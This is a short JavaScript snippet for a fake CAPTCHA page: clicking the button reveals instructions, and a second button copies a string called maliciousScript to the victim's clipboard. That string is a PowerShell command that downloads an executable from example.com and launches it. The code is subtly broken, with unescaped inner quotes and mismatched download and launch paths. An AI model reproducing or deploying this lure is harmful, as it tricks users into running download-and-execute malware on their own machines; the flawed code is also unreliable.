const maliciousScript = "powershell -Command "Invoke-WebRequest -Uri 'https://example.com/file.exe' -OutFile 'C:\ruta\al\archivo\archivo.exe'; Start-Process 'C:\path\to\file\file.exe'"";

document.getElementById('captchaButton').addEventListener('click', function() {
    document.getElementById('captchaButton').style.display = 'none';
    document.getElementById('stepsContainer').style.display = 'block';
});

document.getElementById('executeButton').addEventListener('click', function() {
    navigator.clipboard.writeText(maliciousScript).then(() => {
        alert('The script has been copied to the clipboard. Now follow the instructions.');
    }).catch(err => {
        alert('Could not copy the code to the clipboard: ' + err);
    });
    
});
